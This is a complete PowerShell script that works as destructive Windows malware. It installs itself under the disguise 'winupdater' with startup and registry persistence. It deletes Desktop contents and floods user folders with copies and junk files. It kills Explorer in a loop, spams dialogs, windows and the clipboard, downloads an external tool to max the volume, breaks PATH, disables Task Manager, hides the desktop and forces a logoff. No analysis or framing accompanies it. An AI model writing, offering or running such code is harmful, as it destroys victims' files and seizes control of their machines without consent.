$targetDir = "$env:APPDATA\Microsoft\Windows\winupdater"
$targetPs1 = "$targetDir\winupdater.ps1"
$vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdater.vbs"

if ($MyInvocation.MyCommand.Path -ne $targetPs1) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $targetPs1 -Force
    $vbs = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -windowstyle hidden -ExecutionPolicy Bypass -File ""$targetPs1""", 0
"@
    Set-Content -Path $vbsPath -Value $vbs -Encoding ASCII
    Start-Process "powershell" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File ""$targetPs1"""
    exit
}

Remove-Item "$env:USERPROFILE\Desktop\*" -Recurse -Force -ErrorAction SilentlyContinue
$folders = Get-ChildItem "$env:USERPROFILE\Desktop" -Directory
$names = $folders.Name | Sort-Object {Get-Random}
for ($i = 0; $i -lt $folders.Count; $i++) { Rename-Item $folders[$i].FullName -NewName "temp_$i" }
$renamed = Get-ChildItem "$env:USERPROFILE\Desktop" -Directory
for ($i = 0; $i -lt $renamed.Count; $i++) { Rename-Item $renamed[$i].FullName -NewName $names[$i] }

$targets = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Pictures")
foreach ($t in $targets) {
    if (Test-Path $t) {
        Get-ChildItem $t -File | ForEach-Object { Copy-Item $_.FullName -Destination "$t\$($_.BaseName)_COPY$($_.Extension)" -Force }
    }
}

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('^{%DOWN}')

Start-Job -ScriptBlock { while ($true) { taskkill /f /im explorer.exe; Start-Sleep 5; Start-Process explorer.exe; Start-Sleep 10; Start-Process "https://pointerpointer.com" } }
Start-Job -ScriptBlock { $wsh = New-Object -ComObject WScript.Shell; while ($true) { $wsh.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 100 } }
Start-Job -ScriptBlock { $path = "$env:USERPROFILE\Desktop\maze"; for ($i=0;$i -lt 100;$i++) { $path += "\$i"; New-Item -Path $path -ItemType Directory -Force | Out-Null } }
Add-Type -AssemblyName PresentationFramework
Start-Job -ScriptBlock { while ($true) { [System.Windows.MessageBox]::Show('System Error! Contact your Admin!','Critical Error','OK','Error') | Out-Null; Start-Sleep -Milliseconds 500 } }
Start-Job -ScriptBlock { for ($i=0;$i -lt 500;$i++) { $folder = Get-Random -InputObject $targets; New-Item "$folder\garbage_$i.txt" -Value "LOL" | Out-Null } }
Start-Job -ScriptBlock { while ($true) { Set-Clipboard -Value ('HAHAHA'*(Get-Random -Minimum 100 -Maximum 1000)); Start-Sleep -Milliseconds 100 } }
Start-Job -ScriptBlock { while ($true) { Start-Process "cmd.exe"; Start-Sleep 2 } }

$nircmdPath = "$env:TEMP\nircmd.exe"
Invoke-WebRequest -Uri "https://www.nirsoft.net/utils/nircmd.exe" -OutFile $nircmdPath -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process $nircmdPath -ArgumentList "setsysvolume 65535"

Set-ItemProperty "HKCU:\Environment" "Path" "C:\FakePath"
New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" "DisableTaskMgr" 1
New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" "NoDesktop" 1
Set-ItemProperty "HKCU:\Control Panel\Cursors" "Arrow" ""
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "MyEvilScript" "powershell -w hidden -ep bypass -File `"$targetPs1`""
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" "HideIcons" 1
Stop-Process -Name explorer -Force

Start-Sleep -Seconds 300
shutdown /l /f

